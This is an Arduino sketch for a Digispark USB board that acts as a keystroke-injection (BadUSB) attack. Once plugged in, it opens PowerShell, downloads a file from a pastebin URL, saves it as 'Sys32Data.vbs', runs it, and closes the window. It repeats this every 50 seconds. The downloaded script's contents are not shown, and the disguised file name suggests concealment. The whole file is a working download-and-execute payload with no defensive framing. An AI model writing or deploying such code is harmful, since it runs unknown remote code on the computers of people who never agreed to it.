#include "DigiKeyboard.h"

void setup() {
}

void loop() {
 int d=1000;
 // this is generally not necessary but with some older systems it seems to
 // prevent missing the first character after a delay:
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(d);
 DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
 DigiKeyboard.print("powershell");
 DigiKeyboard.delay(50);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("$client = new-object System.Net.WebClient");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("$client.DownloadFile('https://pastebin.com/cnXDBBz6','Sys32Data.vbs')");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.print("start Sys32Data.vbs");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
 DigiKeyboard.delay(50000);
}
